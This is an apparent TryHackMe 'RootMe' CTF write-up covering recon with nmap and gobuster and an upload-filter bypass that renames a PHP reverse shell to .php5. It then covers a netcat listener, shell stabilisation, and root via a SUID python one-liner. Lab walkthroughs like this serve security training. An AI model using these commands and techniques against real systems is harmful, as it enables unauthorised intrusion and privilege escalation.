# TryHackMe: RootMe Writeup

> **Challenge**: RootMe  
> **Description**: A beginner-friendly CTF: can you root me?  

---

## 🖥️ Deploying the Machine
I started by deploying the machine using the **Start Machine** button on TryHackMe.

---

## 🔍 Reconnaissance

### Port Scanning
The first step was to identify open ports on the target:

```bash
nmap -sV -p- <target-ip>
````

This revealed the services running and answered the first three questions of the reconnaissance section.

### Directory Enumeration

Next, I enumerated hidden directories using **gobuster**:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

This discovered an upload directory, which was the answer to the last reconnaissance question.

---

## 🐚 Getting a Shell

### Upload Form Exploitation

While exploring the upload form:

* Uploading a simple `.sh` script didn’t work.
* Uploading `.php` was blocked.

After some trial and error, I used a **PentestMonkey PHP Reverse Shell**.
I changed:

* **IP** → my attack machine’s `tun0` IP
* **Port** → `8080`

To bypass the filter, I renamed the file extension to `.php5` and uploaded it.

### Listener Setup

On my Kali machine, I started a listener:

```bash
nc -lvnp 8080
```

Then, visiting `http://<target-ip>/uploads/shell.php5` triggered the reverse shell.

### Shell Stabilization

Once I had the shell, I upgraded it for stability:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
reset
export TERM=xterm
```

### User Flag

To find the user flag:

```bash
find / -name user.txt 2>/dev/null
cat /path/to/user.txt
```

✅ Obtained: `THM{<redacted>}`

---

## ⚡ Privilege Escalation

### Finding SUID Binaries

I looked for SUID binaries with:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results, **`/usr/bin/python`** stood out as unusual.

### Exploiting Python SUID

Referring to [GTFOBins](https://gtfobins.github.io/#+suid), I found the exploit for Python SUID binaries.

Running the exploit:

```bash
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

This granted **root access**.

### Root Flag

Finally, I retrieved the root flag:

```bash
cat /root/root.txt
```

✅ Obtained: `THM{<redacted>}`

---

## 🎯 Conclusion

This was a great beginner CTF that taught:

* Recon with **nmap** and **gobuster**
* File upload bypass using `.php5`
* Reverse shell handling & stabilization
* Privilege escalation via **SUID Python exploit**

Rooted successfully 🚩

```